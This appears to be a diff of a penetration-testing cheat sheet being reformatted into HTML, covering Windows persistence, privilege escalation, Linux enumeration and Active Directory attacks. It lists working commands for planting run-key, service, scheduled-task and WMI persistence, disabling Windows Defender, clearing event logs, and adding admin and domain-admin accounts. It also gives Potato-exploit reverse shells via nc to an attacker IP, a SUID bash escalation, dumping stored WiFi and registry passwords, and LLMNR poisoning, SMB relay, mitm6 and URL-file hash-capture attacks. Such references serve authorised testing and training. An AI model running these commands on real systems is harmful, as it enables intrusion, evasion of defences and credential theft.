 <p>sc \\[host] [start/stop] vss</p>
-<p>### Create Scheduled Task</p>
+<h3 id="create-scheduled-task">Create Scheduled Task</h3>
 <p>schtasks /s [host] /ru [user] /create /f /tn [name] /tr [command] /sc ONCE /sd 01/01/1970 /st 00:00</p>
 <p>schtasks /s [host] /run /tn [name]</p>
-<p># Persistence</p>
-<p>## User Level</p>
-<p>**Note:** To find more autorun options, check out [Autoruns from SysInternals](<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank">https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns</a>). This includes startup directories and registry keys.</p>
-<p>### Startup Directories</p>
+<h1 id="persistence">Persistence</h1>
+<h2 id="user-level">User Level</h2>
+<p><strong>Note:</strong> To find more autorun options, check out <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns" target="_blank">Autoruns from SysInternals</a>. This includes startup directories and registry keys.</p>
+<h3 id="startup-directories">Startup Directories</h3>
 <p>●        %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup ⇒ executed when current user logs in</p>
 <p>●        %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup ⇒ executed when any user logs in</p>
-<p>### Registry Run Key</p>
-<p>**Runs When Current User Logs In**</p>
+<h3 id="registry-run-key">Registry Run Key</h3>
+<p><strong>Runs When Current User Logs In</strong></p>
 <p>upload exe file to somewhere in %USERPROFILE%\AppData\Roaming</p>
 <p>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"</p>
-<p>**Runs When Any User Logs In**</p>
+<p><strong>Runs When Any User Logs In</strong></p>
 <p>upload exe file to somewhere in C:\ProgramData</p>
 <p>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v [name] /t REG_SZ /f /d "[path to exe]"</p>
-<p>### Scheduled Task</p>
+<h3 id="scheduled-task">Scheduled Task</h3>
 <p>upload exe file to somewhere in %USERPROFILE%\AppData\Roaming</p>
 <p>schtasks /create /f /tn [name] /tr [path to exe] /sc ONLOGON</p>
 <p>schtasks /create /f /tn [name] /tr [path to exe] /sc DAILY /st [hh:mm]</p>
 <p>●        check with schtasks /query /tn [name] /fo list /v</p>
 <p>●        run manually with schtasks /run /tn [name]</p>
-<p>## System Level</p>
-<p>[DLL Hijacking](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a>)</p>
-<p>### Startup Service</p>
+<h2 id="system-level">System Level</h2>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">DLL Hijacking</a></p>
+<h3 id="startup-service">Startup Service</h3>
 <p>upload file to somewhere in %SystemRoot%\System32</p>
-<p>**Note:** either upload a _service_ executable or use cmd /c start /b [executable] as your binpath</p>
+<p><strong>Note:</strong> either upload a <em>service</em> executable or use cmd /c start /b [executable] as your binpath</p>
 <p>sc create [service] binPath= "[executable]" start= auto displayname= "[name]"</p>
 <p>sc description [service] "[description]"</p>
 <p>sc [start/stop/delete] [service]</p>
-<p>### Scheduled Task</p>
+<h3 id="scheduled-task">Scheduled Task</h3>
 <p>upload exe file to somewhere in %SystemRoot%\System32</p>
 <p>schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc ONSTART</p>
 <p>schtasks /create /f /tn [name] /ru system /tr [path to exe] /sc DAILY /st [hh:mm]</p>
 <p>●        check with schtasks /query /tn [name] /fo list /v</p>
 <p>●        run manually with schtasks /run /tn [name]</p>
-<p>### WMI Event</p>
+<h3 id="wmi-event">WMI Event</h3>
 <p>upload exe file to somewhere in %SystemRoot%\System32</p>
-<p>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="[name]", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</p>
+<p>wmic /NAMESPACE:"\\root\subscription" PATH <strong>EventFilter CREATE Name="[name]", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM </strong>InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</p>
 <p>wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="[name]", ExecutablePath="[executable]",CommandLineTemplate="[executable]"</p>
-<p>wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"[name]\"", Consumer="CommandLineEventConsumer.Name=\"[name]\""</p>
-<p># Recursive File Listing</p>
+<p>wmic /NAMESPACE:"\\root\subscription" PATH <strong>FilterToConsumerBinding CREATE Filter="</strong>EventFilter.Name=\"[name]\"", Consumer="CommandLineEventConsumer.Name=\"[name]\""</p>
+<h1 id="recursive-file-listing">Recursive File Listing</h1>
 <p>dir /s /a \\[host]\[path] &gt; [logfile]</p>
 <p>forfiles /s /c "cmd /c echo @path" /p [path] &gt; [logfile]</p>
 <p>makecab [logfile] [compressed].zip</p>
 <p>extract [compressed].zip [logfile]</p>
-<p># Enable Command Prompt</p>
+<h1 id="enable-command-prompt">Enable Command Prompt</h1>
 <p>reg add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f</p>
-<p># Enable Remote Desktop</p>
+<h1 id="enable-remote-desktop">Enable Remote Desktop</h1>
 <p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f</p>
 <p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f</p>
 <p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</p>
@@ -815,135 +825,135 @@
 <pre><code>            OR
 </code></pre><p>netsh advfirewall set allprofiles state off</p>
 <p>sc start TermService</p>
-<p># User Creation</p>
-<p>### Local</p>
+<h1 id="user-creation">User Creation</h1>
+<h3 id="local">Local</h3>
 <p>net user [username] [password] /add</p>
 <p>net localgroup Administrators [username] /add</p>
 <p>net localgroup "Remote Management Users" [username] /add</p>
 <p>net localgroup "Remote Desktop Users" [username] /add</p>
-<p>### Domain</p>
+<h3 id="domain">Domain</h3>
 <p>net user [username] [password] /add /domain</p>
 <p>net group "Domain Admins" [username] /add /domain</p>
-<p># Insecure Guest Authentication</p>
-<p>### Enable</p>
+<h1 id="insecure-guest-authentication">Insecure Guest Authentication</h1>
+<h3 id="enable">Enable</h3>
 <p>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /t REG_DWORD /d 1 /f</p>
 <p>shutdown /r /f /t 0</p>
-<p>### Disable</p>
+<h3 id="disable">Disable</h3>
 <p>reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v AllowInsecureGuestAuth /f</p>
 <p>shutdown /r /f /t 0</p>
 <p>Privilege Escalation</p>
-<p>[<a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits\](https://gitlab.com/exploit-database/exploitdb-bin-sploits" target="_blank">https://gitlab.com/exploit-database/exploitdb-bin-sploits\](https://gitlab.com/exploit-database/exploitdb-bin-sploits</a>)</p>
-<p># Windows</p>
-<p>## Checklist</p>
-<p>[<a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation\](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation\](https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a>)</p>
-<p>1. access tokens<br></br>2. Administrators group → [fodhelper UAC bypass](<a href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" target="_blank">https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1</a>)<br></br>3. PowerShell history<br></br>4. service permissions<br></br>5. [DLL hijacking](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a>)<br></br>6. recent folders/files<br></br>7. interesting folders/files: C:\, C:\Users<br></br>8. passwords in registry<br></br>9. stored WiFi passwords<br></br>10. kernel version</p>
-<p>[LOLBAS](<a href="https://lolbas-project.github.io" target="_blank">https://lolbas-project.github.io</a>)</p>
-<p>### Check AppLocker/Antivirus</p>
+<p><a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits" target="_blank">https://gitlab.com/exploit-database/exploitdb-bin-sploits</a></p>
+<h1 id="windows">Windows</h1>
+<h2 id="checklist">Checklist</h2>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation</a></p>
+<p>1. access tokens<br></br>2. Administrators group → <a href="https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1" target="_blank">fodhelper UAC bypass</a><br></br>3. PowerShell history<br></br>4. service permissions<br></br>5. <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking" target="_blank">DLL hijacking</a><br></br>6. recent folders/files<br></br>7. interesting folders/files: C:\, C:\Users<br></br>8. passwords in registry<br></br>9. stored WiFi passwords<br></br>10. kernel version</p>
+<p><a href="https://lolbas-project.github.io" target="_blank">LOLBAS</a></p>
+<h3 id="check-applockerantivirus">Check AppLocker/Antivirus</h3>
 <p>(Get-ApplockerPolicy -Effective).RuleCollections</p>
 <p>Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop</p>
 <p>Get-MpComputerStatus</p>
 <p>sc query windefend</p>
-<p>### Disable Windows Defender</p>
+<h3 id="disable-windows-defender">Disable Windows Defender</h3>
 <p>sc config WinDefend start= disabled</p>
 <p>Set-MpPreference -DisableRealtimeMonitoring $true</p>
 <p>"%ProgramFiles%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All</p>
-<p>### Clear Event Log</p>
+<h3 id="clear-event-log">Clear Event Log</h3>
 <p>Clear-EventLog -LogName Application, Security</p>
-<p>### Access Tokens</p>
-<p>[HackTricks Token Abuse](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens</a>)</p>
+<h3 id="access-tokens">Access Tokens</h3>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens" target="_blank">HackTricks Token Abuse</a></p>
 <p>SeImpersonatePrivilege → Potato Attacks</p>
-<p>[SweetPotato](<a href="https://github.com/CCob/SweetPotato" target="_blank">https://github.com/CCob/SweetPotato</a>), [GodPotato](<a href="https://github.com/BeichenDream/GodPotato" target="_blank">https://github.com/BeichenDream/GodPotato</a>)</p>
+<p><a href="https://github.com/CCob/SweetPotato" target="_blank">SweetPotato</a>, <a href="https://github.com/BeichenDream/GodPotato" target="_blank">GodPotato</a></p>
 <p>SweetPotato.exe -p nc.exe -a "-nv [ip] [port] -e cmd" &amp;</p>
 <p>GodPotato.exe -cmd "nc -nv [ip] [port] -e cmd" &amp;</p>
 <p>GodPotato.exe -cmd "net user [username] [password] /add"</p>
 <p>GodPotato.exe -cmd "net localgroup Administrators [username] /add"</p>
 <p>runascs [username] [password] cmd -b -r [attacker ip]:[port]</p>
-<p>SeRestorePrivilege → [SeRestoreAbuse](<a href="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" target="_blank">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</a>)</p>
-<p>### PowerShell History</p>
+<p>SeRestorePrivilege → <a href="https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe" target="_blank">SeRestoreAbuse</a></p>
+<h3 id="powershell-history">PowerShell History</h3>
 <p>Get-History</p>
 <p>(Get-PSReadlineOption).HistorySavePath</p>
 <p>●        type [path]</p>
-<p>### Service Permissions</p>
-<p>**Recommended:** use a script like [PrivescCheck.ps1](<a href="https://github.com/itm4n/PrivescCheck" target="_blank">https://github.com/itm4n/PrivescCheck</a>)</p>
+<h3 id="service-permissions">Service Permissions</h3>
+<p><strong>Recommended:</strong> use a script like <a href="https://github.com/itm4n/PrivescCheck" target="_blank">PrivescCheck.ps1</a></p>
 <p>sc qc [service]</p>
 <p>sc sdshow [service] ⇒ list service permissions</p>
 <p>icacls [path] ⇒ list folder/file permissions (eg. unquoted service path)</p>
 <p>sc config [service] binpath= "[executable]" ⇒ reconfigure service</p>
-<p>●        [executable] can either be a _service_ executable or cmd /c start /b [executable]</p>
+<p>●        [executable] can either be a <em>service</em> executable or cmd /c start /b [executable]</p>
 <p>sc [start/stop] [service]</p>
-<p>### DLL Hijacking</p>
-<p>[Generate malicious DLL](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\#creating-and-compiling-dlls" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\#creating-and-compiling-dlls</a>)</p>
+<h3 id="dll-hijacking">DLL Hijacking</h3>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#creating-and-compiling-dlls" target="_blank">Generate malicious DLL</a></p>
 <p>msfvenom [options] -f dll -o [file].dll</p>
-<p>### Recent Folders/Files</p>
+<h3 id="recent-foldersfiles">Recent Folders/Files</h3>
 <p>dir %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Recent</p>
-<p>### Interesting Folders/Files</p>
-<p>Get-ChildItem -Path C:\Users -Include *.txt,*.ini,*.pdf,*.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue</p>
-<p>### Passwords in Registry</p>
+<h3 id="interesting-foldersfiles">Interesting Folders/Files</h3>
+<p>Get-ChildItem -Path C:\Users -Include <em>.txt,</em>.ini,<em>.pdf,</em>.kdbx,*.exe -Recurse -ErrorAction SilentlyContinue</p>
+<h3 id="passwords-in-registry">Passwords in Registry</h3>
 <p>reg query HKLM /f password /t REG_SZ /s</p>
-<p>### Stored WiFi Passwords</p>
+<h3 id="stored-wifi-passwords">Stored WiFi Passwords</h3>
 <p>netsh wlan show profiles</p>
 <p>netsh wlan export profile folder=. key=clear</p>
-<p>### Kernel Exploits</p>
-<p>[<a href="https://github.com/51x/WHP\](https://github.com/51x/WHP" target="_blank">https://github.com/51x/WHP\](https://github.com/51x/WHP</a>)</p>
-<p>[<a href="https://github.com/SecWiki/windows-kernel-exploits\](https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits\](https://github.com/SecWiki/windows-kernel-exploits</a>)</p>
-<p>## Guides</p>
-<p>●        [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</a>)</p>
-<p>●        [HackTricks](<a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation</a>)</p>
-<p>●        [Sushant 747’s Guide](<a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html" target="_blank">https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html</a>)</p>
-<p>●        [Fuzzy Security Guide](<a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank">https://www.fuzzysecurity.com/tutorials/16.html</a>)</p>
-<p>●        [Absoloom's Guide](<a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a>)</p>
-<p>## Scripts</p>
-<p>### Executables</p>
-<p>●        [winPEAS](<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</a>)</p>
-<p>●        [Seatbelt](<a href="https://github.com/GhostPack/Seatbelt" target="_blank">https://github.com/GhostPack/Seatbelt</a>) (compile)</p>
-<p>●        [SharpUp](<a href="https://github.com/GhostPack/SharpUp" target="_blank">https://github.com/GhostPack/SharpUp</a>) (compile)</p>
-<p>●        [Watson](<a href="https://github.com/rasta-mouse/Watson" target="_blank">https://github.com/rasta-mouse/Watson</a>) (compile)</p>
-<p>### PowerShell</p>
-<p>●        [PrivescCheck](<a href="https://github.com/itm4n/PrivescCheck" target="_blank">https://github.com/itm4n/PrivescCheck</a>)</p>
+<h3 id="kernel-exploits">Kernel Exploits</h3>
+<p><a href="https://github.com/51x/WHP" target="_blank">https://github.com/51x/WHP</a></p>
+<p><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank">https://github.com/SecWiki/windows-kernel-exploits</a></p>
+<h2 id="guides">Guides</h2>
+<p>●        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank">PayloadsAllTheThings</a></p>
+<p>●        <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation" target="_blank">HackTricks</a></p>
+<p>●        <a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html" target="_blank">Sushant 747’s Guide</a></p>
+<p>●        <a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank">Fuzzy Security Guide</a></p>
+<p>●        <a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank">Absoloom's Guide</a></p>
+<h2 id="scripts">Scripts</h2>
+<h3 id="executables">Executables</h3>
+<p>●        <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" target="_blank">winPEAS</a></p>
+<p>●        <a href="https://github.com/GhostPack/Seatbelt" target="_blank">Seatbelt</a> (compile)</p>
+<p>●        <a href="https://github.com/GhostPack/SharpUp" target="_blank">SharpUp</a> (compile)</p>
+<p>●        <a href="https://github.com/rasta-mouse/Watson" target="_blank">Watson</a> (compile)</p>
+<h3 id="powershell">PowerShell</h3>
+<p>●        <a href="https://github.com/itm4n/PrivescCheck" target="_blank">PrivescCheck</a></p>
 <p>○        Invoke-PrivescCheck -Extended</p>
 <p>○        Invoke-PrivescCheck -Extended -Report "PrivescCheck_$($env:COMPUTERNAME)" -Format TXT,CSV,HTML,XML</p>
-<p>●        [PowerUp](<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a>) (deprecated)</p>
+<p>●        <a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" target="_blank">PowerUp</a> (deprecated)</p>
 <p>○        Invoke-AllChecks</p>
-<p>●        [Jaws](<a href="https://github.com/411Hall/JAWS" target="_blank">https://github.com/411Hall/JAWS</a>)</p>
-<p>●        [Sherlock](<a href="https://github.com/rasta-mouse/Sherlock" target="_blank">https://github.com/rasta-mouse/Sherlock</a>) (deprecated)</p>
-<p>### Other</p>
-<p>●        [windows-exploit-suggester](<a href="https://github.com/bitsadmin/wesng" target="_blank">https://github.com/bitsadmin/wesng</a>) ⇒ get kernel exploits from sysinfo</p>
+<p>●        <a href="https://github.com/411Hall/JAWS" target="_blank">Jaws</a></p>
+<p>●        <a href="https://github.com/rasta-mouse/Sherlock" target="_blank">Sherlock</a> (deprecated)</p>
+<h3 id="other">Other</h3>
+<p>●        <a href="https://github.com/bitsadmin/wesng" target="_blank">windows-exploit-suggester</a> ⇒ get kernel exploits from sysinfo</p>
 <p>○        wes --update</p>
 <p>○        wes systeminfo.txt -c -e -i "Elevation"</p>
 <p>●        Meterpreter run post/multi/recon/local_exploit_suggester</p>
 <p>●        Meterpreter getsystem</p>
-<p># Linux</p>
-<p>## Checklist</p>
-<p>[<a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist\](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a>)</p>
-<p>1. SUID*<br></br>2. sudo*<br></br>3. processes running as root<br></br>4. internal services → [port redirection](#_d5r3jiqlkrpf)<br></br>5. cron jobs<br></br>6. interesting folders/files: /, /opt, /home<br></br>7. kernel version</p>
-<p>*check [GTFObins](<a href="https://gtfobins.github.io" target="_blank">https://gtfobins.github.io</a>)</p>
-<p>### SUID</p>
+<h1 id="linux">Linux</h1>
+<h2 id="checklist">Checklist</h2>
+<p><a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a></p>
+<p>1. SUID<em><br></br>2. sudo</em><br></br>3. processes running as root<br></br>4. internal services → <a href="#_d5r3jiqlkrpf">port redirection</a><br></br>5. cron jobs<br></br>6. interesting folders/files: /, /opt, /home<br></br>7. kernel version</p>
+<p>*check <a href="https://gtfobins.github.io" target="_blank">GTFObins</a></p>
+<h3 id="suid">SUID</h3>
 <p>find / ⁠-perm -u=s -user root 2&gt;/dev/null</p>
 <p>find / -perm -g=s -group root 2&gt;/dev/null</p>
 <p>getcap -r / 2&gt;/dev/null</p>
-<p>### Sudo</p>
+<h3 id="sudo">Sudo</h3>
 <p>sudo -l</p>
-<p>### Processes</p>
+<h3 id="processes">Processes</h3>
 <p>ps fauxww</p>
 <p>ps -ewwo pid,user,cmd --forest</p>
-<p>### Services</p>
+<h3 id="services">Services</h3>
 <p>netstat/ss -antup</p>
 <p>netstat/ss -plunt</p>
-<p>### Cron Jobs</p>
+<h3 id="cron-jobs">Cron Jobs</h3>
 <p>cat /etc/crontab</p>
 <p>ls /var/spool/cron</p>
 <p>ls /etc/cron.*</p>
-<p>## Guides</p>
-<p>●        [PayloadsAllTheThings](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a>)</p>
-<p>●        [HackTricks](<a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist</a>)</p>
-<p>●        [Sushant 747’s Guide](<a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html" target="_blank">https://sushant747.gitbooks.io/total-oscp-guide/content/privilege\_escalation\_-\_linux.html</a>)</p>
-<p>●        [g0tmi1k Blog](<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a>)</p>
-<p>## Scripts</p>
-<p>●        [linPEAS](<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a>)</p>
-<p>●        [linux-smart-enumeration](<a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">https://github.com/diego-treitos/linux-smart-enumeration</a>)</p>
-<p>●        [LinEnum](<a href="https://github.com/rebootuser/LinEnum" target="_blank">https://github.com/rebootuser/LinEnum</a>)</p>
-<p>●        [linuxprivchecker](<a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank">https://github.com/sleventyeleven/linuxprivchecker</a>)</p>
-<p>●        [linux-exploit-suggester](<a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank">https://github.com/The-Z-Labs/linux-exploit-suggester</a>)</p>
+<h2 id="guides">Guides</h2>
+<p>●        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank">PayloadsAllTheThings</a></p>
+<p>●        <a href="https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist" target="_blank">HackTricks</a></p>
+<p>●        <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html" target="_blank">Sushant 747’s Guide</a></p>
+<p>●        <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank">g0tmi1k Blog</a></p>
+<h2 id="scripts">Scripts</h2>
+<p>●        <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank">linPEAS</a></p>
+<p>●        <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank">linux-smart-enumeration</a></p>
+<p>●        <a href="https://github.com/rebootuser/LinEnum" target="_blank">LinEnum</a></p>
+<p>●        <a href="https://github.com/sleventyeleven/linuxprivchecker" target="_blank">linuxprivchecker</a></p>
+<p>●        <a href="https://github.com/The-Z-Labs/linux-exploit-suggester" target="_blank">linux-exploit-suggester</a></p>
 <p>●        Meterpreter run post/multi/recon/local_exploit_suggester</p>
 <p>int main {</p>
 <pre><code>            setuid(0);
@@ -954,15 +964,15 @@
 </code></pre><p>}</p>
 <p>cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p</p>
 <p>Active Directory (AD)</p>
-<p>[<a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg\](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg" target="_blank">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg\](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest\_ad\_dark\_2022\_11.svg</a>)</p>
-<p>**Sync clock:** timedatectl set-ntp 0 &amp;&amp; ntpdate -u [domain]</p>
-<p># LLMNR/NBT-NS Poisoning</p>
+<p><a href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg" target="_blank">https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg</a></p>
+<p><strong>Sync clock:</strong> timedatectl set-ntp 0 &amp;&amp; ntpdate -u [domain]</p>
+<h1 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h1>
 <p>●        responder -I [interface] -dwP (optional -v)</p>
 <p>○        Remember you can get interface with ip a</p>
 <p>●        hashcat -m 5600 [file containing obtained hash] [wordlist]</p>
-<p># SMB Relay</p>
-<p>**Requirements:** SMB signing disabled and relayed credentials are admin on the target machine</p>
-<p>**Note:** You can’t relay back to the same machine.</p>
+<h1 id="smb-relay">SMB Relay</h1>
+<p><strong>Requirements:</strong> SMB signing disabled and relayed credentials are admin on the target machine</p>
+<p><strong>Note:</strong> You can’t relay back to the same machine.</p>
 <p>●        discover hosts with SMB signing disabled:</p>
 <p>○        Nessus scan will tell you</p>
 <p>OR</p>
@@ -986,17 +996,17 @@
 <p>■        Can be msfvenom payload for example</p>
 <p>○        -c "[command]" ⇒ execute command</p>
 <p>○        -l [directory] ⇒ store loot in directory (see IPv6 attacks) → useful if credentials are non-admin</p>
-<p># IPv6 Attack</p>
-<p>[<a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/\](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/\](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a>)</p>
-<p>●        Install MITM6 → download from [GitHub](<a href="https://github.com/dirkjanm/mitm6" target="_blank">https://github.com/dirkjanm/mitm6</a>), cd to directory, and pip3 install .</p>
+<h1 id="ipv6-attack">IPv6 Attack</h1>
+<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></p>
+<p>●        Install MITM6 → download from <a href="https://github.com/dirkjanm/mitm6" target="_blank">GitHub</a>, cd to directory, and pip3 install .</p>
 <p>○        If it fails, try normal pip</p>
 <p>●        mitm6 -d [domain]</p>
 <p>AND</p>
 <p>●        impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh bogus.[domain] -l [directory]</p>
 <p>●        cd to directory and firefox [file] to see info</p>
 <p>●        look for username and password for newly created user in ntlmrelayx prompt</p>
-<p># URL File Attack</p>
-<p>**Note:** must have access to a writable SMB share</p>
+<h1 id="url-file-attack">URL File Attack</h1>
+<p><strong>Note:</strong> must have access to a writable SMB share</p>
 <p>●        upload file that starts with @ or ~ symbol and ends in .url: @test.url</p>
 <p>○        (@ or ~) ensures it shows up at top when user opens share</p>
 <p>○        File contents:</p>
@@ -1006,12 +1016,12 @@
 <p>IconFile=\\[attacker ip]\%USERNAME%.icon</p>
 <p>IconIndex=1</p>
 <p>●        responder -I [interface] -v</p>
